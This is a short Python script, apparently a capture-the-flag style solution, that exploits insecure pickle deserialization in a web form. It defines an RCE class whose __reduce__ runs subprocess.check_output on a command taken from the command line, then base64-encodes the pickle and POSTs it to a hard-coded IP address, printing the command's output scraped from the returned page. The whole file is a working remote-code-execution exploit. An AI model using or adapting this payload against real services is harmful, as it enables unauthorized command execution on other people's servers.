import requests
import base64
from bs4 import BeautifulSoup as BSHTML
import os
import pickle
import subprocess
import sys

url = 'http://35.211.215.131:8000'

def extract_response(response):
	bs = BSHTML(response, features="html.parser")
	textareas = bs.find_all('textarea')
	return textareas[1].text.strip()

def send_payload(message):
	payload = {"text": message}
	r = requests.post(url, data=payload)

	data = extract_response(r.text)
	if not data:
		print(r.text)
	return data

class RCE():
	def __init__(self, cmd):
		self.cmd = cmd
	def __reduce__(self):
		return (subprocess.check_output, ([*self.cmd.split(' '),],))

command = sys.argv[1]
pickled = pickle.dumps(RCE(command))
form_input = base64.urlsafe_b64encode(pickled)
print(f"Input: {form_input}")
response = send_payload(form_input)
print(f"Response: {response}")